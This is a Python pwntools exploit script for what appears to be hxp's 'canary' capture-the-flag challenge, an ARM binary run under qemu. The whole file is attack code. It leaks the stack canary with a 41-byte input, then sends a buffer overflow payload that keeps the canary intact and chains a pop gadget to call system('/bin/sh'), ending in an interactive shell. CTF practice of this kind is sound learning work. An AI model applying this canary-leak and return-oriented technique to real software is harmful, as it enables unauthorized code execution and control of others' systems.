import pwn as p

target = p.process(['qemu-arm', 'canary'])

target.recvuntil('Welcome to hxp\'s Echo Service!\n> ')
leak_canary_payload = '0' * 41
target.send(leak_canary_payload)
target.recvuntil(leak_canary_payload)

# unpack the canary
canary = p.u32(b'\x00' + target.recvline().strip())

print('canary:', hex(canary))

# now prepare the shell popping payload
system_addr = 0x00016d90
binsh_addr = 0x00071eb0
pop_gadget_addr = 0x00026b7c  # /!\ will pop 3 registers


payload = b'\x30' * 40
payload += p.p32(canary)
payload += b'\x30' * 0xc  # padding until return pointer
payload += p.p32(pop_gadget_addr)
payload += p.p32(binsh_addr)  # r0
payload += p.p32(0)  # r4
payload += p.p32(system_addr)  # pc

target.send(payload)

print('Payload sent')

target.sendline()

target.interactive()
